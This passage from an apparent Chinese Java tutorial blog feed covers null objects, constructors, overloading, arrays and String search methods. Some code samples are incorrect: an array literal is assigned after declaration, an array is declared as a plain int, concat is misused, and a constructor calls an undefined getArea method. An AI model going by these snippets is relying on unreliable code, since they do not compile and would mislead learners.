class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String name ;</span><br><span class="line">name = <span class="keyword">new</span> String(<span class="string">"Hello World"</span>);</span><br></pre></td></tr></table></figure></div><h3 id="空对象"><a href="#空对象" class="headerlink" title="空对象"></a>空对象</h3><blockquote><h4 id="一个引用变量没有通过new分配内存空间，这个对象就是空对象，java使用null表示空对象。"><a href="#一个引用变量没有通过new分配内存空间，这个对象就是空对象，java使用null表示空对象。" class="headerlink" title="一个引用变量没有通过new分配内存空间，这个对象就是空对象，java使用null表示空对象。"></a>一个引用变量没有通过new分配内存空间，这个对象就是空对象，java使用null表示空对象。</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String name = null;</span><br><span class="line">name = &quot;Hello World&quot;;</span><br></pre></td></tr></table></figure></div><blockquote><h4 id="引用变量默认值是-null。当试图调用一个空对象的实例变量或实例方法时，会抛出空指针异常-NullPointerException"><a href="#引用变量默认值是-null。当试图调用一个空对象的实例变量或实例方法时，会抛出空指针异常-NullPointerException" class="headerlink" title="引用变量默认值是 null。当试图调用一个空对象的实例变量或实例方法时，会抛出空指针异常 NullPointerException"></a>引用变量默认值是 null。当试图调用一个空对象的实例变量或实例方法时，会抛出空指针异常 NullPointerException</h4></blockquote><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><blockquote><h4 id="构造方法名必须与类名相同。"><a href="#构造方法名必须与类名相同。" class="headerlink" title="构造方法名必须与类名相同。"></a>构造方法名必须与类名相同。</h4><h4 id="构造方法没有任何返回值。"><a href="#构造方法没有任何返回值。" class="headerlink" title="构造方法没有任何返回值。"></a>构造方法没有任何返回值。</h4><h4 id="构造方法只能与new结合使用。"><a href="#构造方法只能与new结合使用。" class="headerlink" title="构造方法只能与new结合使用。"></a>构造方法只能与new结合使用。</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> width;</span><br><span class="line">    <span class="keyword">int</span> height;</span><br><span class="line">    <span class="keyword">int</span> area;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Rectangle</span><span class="params">(<span class="keyword">int</span> w,<span class="keyword">int</span> h)</span></span>&#123;</span><br><span class="line">        width = w ;</span><br><span class="line">        height = h ;</span><br><span class="line">        area = getArea(w,h);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="默认构造方法"><a href="#默认构造方法" class="headerlink" title="默认构造方法"></a>默认构造方法</h3><blockquote><h4 id="默认构造方法的方法体内无任何语句，也就不能够初始化成员变量了。"><a href="#默认构造方法的方法体内无任何语句，也就不能够初始化成员变量了。" class="headerlink" title="默认构造方法的方法体内无任何语句，也就不能够初始化成员变量了。"></a>默认构造方法的方法体内无任何语句，也就不能够初始化成员变量了。</h4></blockquote><h3 id="构造方法重载"><a href="#构造方法重载" class="headerlink" title="构造方法重载"></a>构造方法重载</h3><blockquote><h4 id="在一个类中可以多个构造方法，他们具有相同的名字，参数列表不同，所以他们之间一定是重载关系。"><a href="#在一个类中可以多个构造方法，他们具有相同的名字，参数列表不同，所以他们之间一定是重载关系。" class="headerlink" title="在一个类中可以多个构造方法，他们具有相同的名字，参数列表不同，所以他们之间一定是重载关系。"></a>在一个类中可以多个构造方法，他们具有相同的名字，参数列表不同，所以他们之间一定是重载关系。</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name ;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age ;</span><br><span class="line">    <span class="keyword">private</span> Date birthday ;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String n,<span class="keyword">int</span> a,Date b)</span></span>&#123;</span><br><span class="line">        name = n;</span><br><span class="line">        age = a ;</span><br><span class="line">        birthday = b ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">Person</span><span class="params">(String n ,<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">        name = n ;</span><br><span class="line">        age = a ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String n, Date b)</span></span>&#123;</span><br><span class="line">        name = n ;</span><br><span class="line">        age = <span class="number">30</span> ;</span><br><span class="line">        birthday = b ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">Person</span><span class="params">(String n)</span></span>&#123;</span><br><span class="line">        name = n ;</span><br><span class="line">        age = <span class="number">30</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String  <span class="title">getinfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        sb.append(<span class="string">"名字："</span>).append(name).append(<span class="string">"\n"</span>);</span><br><span class="line">        sb.append(<span class="string">"年龄："</span>).append(age).append(<span class="string">"\n"</span>);</span><br><span class="line">        sb.append(<span class="string">"出生日："</span>).append(birthday).append(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>  sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="构造方法封装"><a href="#构造方法封装" class="headerlink" title="构造方法封装"></a>构造方法封装</h3><blockquote><h4 id="构造方法可以封装，访问级别和普通方法一样。"><a href="#构造方法可以封装，访问级别和普通方法一样。" class="headerlink" title="构造方法可以封装，访问级别和普通方法一样。"></a>构造方法可以封装，访问级别和普通方法一样。</h4></blockquote><h3 id="this关键词"><a href="#this关键词" class="headerlink" title="this关键词"></a>this关键词</h3><blockquote><h4 id="this指向对象本身，一个类可以通过this来获得一个代表它自身的对象变量。"><a href="#this指向对象本身，一个类可以通过this来获得一个代表它自身的对象变量。" class="headerlink" title="this指向对象本身，一个类可以通过this来获得一个代表它自身的对象变量。"></a>this指向对象本身，一个类可以通过this来获得一个代表它自身的对象变量。</h4><h4 id="调用实例变量。"><a href="#调用实例变量。" class="headerlink" title="[ ]调用实例变量。"></a>[ ]调用实例变量。</h4><h4 id="调用实例方法。"><a href="#调用实例方法。" class="headerlink" title="[ ]调用实例方法。"></a>[ ]调用实例方法。</h4><h4 id="调用其他构造方法。"><a href="#调用其他构造方法。" class="headerlink" title="[ ]调用其他构造方法。"></a>[ ]调用其他构造方法。</h4></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java数组</title>
      <link href="/2019/01/30/java-shu-zu/"/>
      <url>/2019/01/30/java-shu-zu/</url>
      
        <content type="html"><![CDATA[<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><h3 id="数组初始化"><a href="#数组初始化" class="headerlink" title="数组初始化"></a>数组初始化</h3><h4 id="静态数组初始化"><a href="#静态数组初始化" class="headerlink" title="静态数组初始化"></a>静态数组初始化</h4><blockquote><p> 静态数组初始化是将元素放入大括号中。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> intarray;</span><br><span class="line">intarray = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure></div><h4 id="动态数组初始化"><a href="#动态数组初始化" class="headerlink" title="动态数组初始化"></a>动态数组初始化</h4><blockquote><p>  动态数组初始化是由new运算符分配长度的内存空间。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int array;</span><br><span class="line">array = new int[4];</span><br><span class="line">array[0] = 1;</span><br><span class="line">array[1] = 2;</span><br><span class="line">array[2] = 3;</span><br><span class="line">array[3] = 4;</span><br></pre></td></tr></table></figure></div><h3 id="数组合并"><a href="#数组合并" class="headerlink" title="数组合并"></a>数组合并</h3><blockquote><p>  数组的长度是不可变化的，想要将两个数组合并。需要创建一个新的数组，新数组的长度是两个数组长度的和。然后将两个数组的内容导入新的数组中。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">merge</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> array1[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> array2[] = &#123;<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> array[] = <span class="keyword">new</span> <span class="keyword">int</span>[array1.length+array2.length];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;array.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (i&lt;array1.length)&#123;</span><br><span class="line">                array[i] = array1[i];</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                array[i] = array2[i-array1.length];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"合并后："</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> item : array)&#123;</span><br><span class="line">            System.out.printf(<span class="string">"%d"</span>,item);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">合并后：</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure></div><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><h3 id="二维数组声明"><a href="#二维数组声明" class="headerlink" title="二维数组声明"></a>二维数组声明</h3><blockquote><p> 二维数组声明需要两个zhong’ku’y中括号<br> 元素数据类型[][] 数组变量名;<br> 元素数据类型 数组变量名[][];<br> 元素数据类型[] 数组变量名[];</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int[][] array1;</span><br><span class="line">int array2[][];</span><br><span class="line">int[] array3[];</span><br></pre></td></tr></table></figure></div><h3 id="二维数组初始化"><a href="#二维数组初始化" class="headerlink" title="二维数组初始化"></a>二维数组初始化</h3><h4 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int array[][] = &#123;&#123;1,2,3&#125;,&#123;4,5,6&#125;,&#123;7,8,9&#125;&#125;;</span><br></pre></td></tr></table></figure></div><p> 上述是创建并初始化了3x3的二维数组。</p><h4 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h4><blockquote><p> new 元素数据类型[高维数组长度][低维数组长度]   高维数组就是最外层的数组，低维数组是每个元素的数组。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Two_dimensional_array</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] array = &#123;</span><br><span class="line">                &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">                &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;,</span><br><span class="line">                &#123;<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">double</span>[][] doublearray = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">3</span>][<span class="number">3</span>];</span><br><span class="line">        System.out.println(array.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; array.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; array[i].length;j++)&#123;</span><br><span class="line">                doublearray[i][j] = Math.sqrt(array[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; doublearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; doublearray[i].length;j++)&#123;</span><br><span class="line">                System.out.printf(<span class="string">"[%d][%d] =  %f"</span>,i,j,doublearray[i][j]);</span><br><span class="line">                System.out.print(<span class="string">"\t"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">[0][0] =  1.000000[0][1] =  1.414214[0][2] =  1.732051</span><br><span class="line">[1][0] =  2.000000[1][1] =  2.236068[1][2] =  2.449490</span><br><span class="line">[2][0] =  2.645751[2][1] =  2.828427[2][2] =  3.000000</span><br></pre></td></tr></table></figure></div><h3 id="不规则数组"><a href="#不规则数组" class="headerlink" title="不规则数组"></a>不规则数组</h3><h4 id="不规则数组初始化"><a href="#不规则数组初始化" class="headerlink" title="不规则数组初始化"></a>不规则数组初始化</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int[][] array = new  int[4][];</span><br><span class="line">array[0] = new int[2];</span><br><span class="line">array[1] = new int[1];</span><br><span class="line">array[2] = new int[5];</span><br><span class="line">array[3] = new int[2];</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">irregular</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>][];</span><br><span class="line">        array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">        array[<span class="number">1</span>] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        array[<span class="number">2</span>] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; array.length;i ++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; array[i].length;j++)&#123;</span><br><span class="line">                array[i][j] = i+j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] x : array)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> y : x)&#123;</span><br><span class="line">                System.out.print(y);</span><br><span class="line">                System.out.print(<span class="string">"\t"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">01</span><br><span class="line">123</span><br><span class="line">23</span><br></pre></td></tr></table></figure></div><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="Java中的字符串"><a href="#Java中的字符串" class="headerlink" title="Java中的字符串"></a>Java中的字符串</h3><blockquote><p> Java SE 提供了三个字符串类：String,StringBuffer和StringBuilder。String是不可变字符串，StringBuffer和StringBuilder是可变字符串。</p></blockquote><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><blockquote><p> String虽然是不可变字符串，但是也可以进行拼接只是会产生一个新的对象。String字符串拼接可以使用+或者String的concat方法。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String s1 = &quot;Hello&quot;;</span><br><span class="line">String s2 = s1 + &quot; &quot;;</span><br><span class="line">String s3 = s2 + &quot;world!&quot;;</span><br><span class="line">System.out.println(s3);</span><br><span class="line"></span><br><span class="line">String s4 = &quot;Hello&quot;;</span><br><span class="line">String s5 = s4 + concat(&quot; &quot;)+concat(&quot;World!&quot;);</span><br><span class="line">System.out.println(s5);</span><br></pre></td></tr></table></figure></div><h3 id="字符串查找"><a href="#字符串查找" class="headerlink" title="字符串查找"></a>字符串查找</h3><blockquote><p> String类中提供了indexOf和lastIndexOf方法用于查找字符或字符串。，返回值是查找的字符或字符串的位置，-1表示未找到。</p><ul><li>int indexOf(int ch)从前往后搜索字符ch，返回第一次查找到字符ch所在处的索引。</li><li>int indexOf(int ch,int fromIndex):从指定的索引开始从前往后搜索字符ch，返回第一次查找到的字符。</li><li>int indexOf(String str):从前往后搜索字符串str，返回第一次查找到字符串的索引位置。</li><li>int indexOf(String str,int fromIndex): 从指定的索引 开始从前往后查找字符串，返回第一次查找到字符串索引位置。</li><li>int lastIndexOf(int ch)：从后往前搜索字符串，返回第一次查找到字符所在处。</li><li>int lastIndexOf(int ch，int fromIndex)：从指定索引开始从后往前查找字符。返回第一次查找到字符索引所在位置。</li><li>int lastIndexOf(String str)：从后往前搜索字符串str，返回第一次 查找字符串所在位置。</li><li>int lastIndexOf(String str,  int fromIndex)：从指定索引开始从后往前搜索，返回第一次字符串所在处索引。</li></ul></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">java_str</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String sourceStr =  <span class="string">"There is a string accessing example."</span>;</span><br><span class="line">        <span class="keyword">int</span> len = sourceStr.length();</span><br><span class="line">        <span class="keyword">char</span> ch = sourceStr.charAt(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> firstchart1 = sourceStr.indexOf(<span class="string">'r'</span>);</span><br><span class="line">        <span class="keyword">int</span> lastchart1 = sourceStr.lastIndexOf(<span class="string">'r'</span>);</span><br><span class="line">        <span class="keyword">int</span> firststr1 = sourceStr.indexOf(<span class="string">"ing"</span>);</span><br><span class="line">        <span class="keyword">int</span> laststr1 = sourceStr.lastIndexOf(<span class="string">"ing"</span>);</span><br><span class="line">        <span class="keyword">int</span> firstchrat2 = sourceStr.indexOf(<span class="string">'e'</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="keyword">int</span> lastchart2 = sourceStr.lastIndexOf(<span class="string">'e'</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="keyword">int</span> firststr2 = sourceStr.indexOf(<span class="string">"ing"</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">int</span> laststr2 = sourceStr.lastIndexOf(<span class="string">"ing"</span>,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"原始数据："</span>+sourceStr);</span><br><span class="line">        System.out.println(<span class="string">"字符串长度："</span>+len);</span><br><span class="line">        System.out.println(<span class="string">"索引16的字符："</span>+ch);</span><br><span class="line">        System.out.println(<span class="string">"字符r从前往后，所在索引位置："</span>+firstchart1);</span><br><span class="line">        System.out.println(<span class="string">"字符r从后往前，所在索引位置："</span>+lastchart1);</span><br><span class="line">        System.out.println(<span class="string">"字符串ing从前往后，所在索引位置："</span>+firststr1);</span><br><span class="line">        System.out.println(<span class="string">"字符串ing从后往前，所在索引位置："</span>+laststr1);</span><br><span class="line">        System.out.println(<span class="string">"索引从15开始，从前往后搜索e字符，所在索引位置："</span>+firstchrat2);</span><br><span class="line">        System.out.println(<span class="string">"索引从15开始，从后往前搜索e字符，所在索引位置："</span>+lastchart2);</span><br><span class="line">        System.out.println(<span class="string">"索引从5开始，从前往后搜索ing字符串，所在索引位置："</span>+firststr2);</span><br><span class="line">        System.out.println(<span class="string">"索引从5开始，从后往前搜索ing字符串，所在索引位置："</span>+laststr2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">原始数据：There is a string accessing example.</span><br><span class="line">字符串长度：36</span><br><span class="line">索引16的字符：g</span><br><span class="line">字符r从前往后，所在索引位置：3</span><br><span class="line">字符r从后往前，所在索引位置：13</span><br><span class="line">字符串ing从前往后，所在索引位置：14</span><br><span class="line">字符串ing从后往前，所在索引位置：24</span><br><span class="line">索引从15开始，从前往后搜索e字符，所在索引位置：21</span><br><span class="line">索引从15开始，从后往前搜索e字符，所在索引位置：4</span><br><span class="line">索引从5开始，从前往后搜索ing字符串，所在索引位置：14</span><br><span class="line">索引从5开始，从后往前搜索ing字符串，所在索引位置：-1</span><br></pre></td></tr></table></figure></div><h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><blockquote><h4 id="字符串比较常见操作，包括比较大小，比较相等，比较前缀和后缀等"><a href="#字符串比较常见操作，包括比较大小，比较相等，比较前缀和后缀等" class="headerlink" 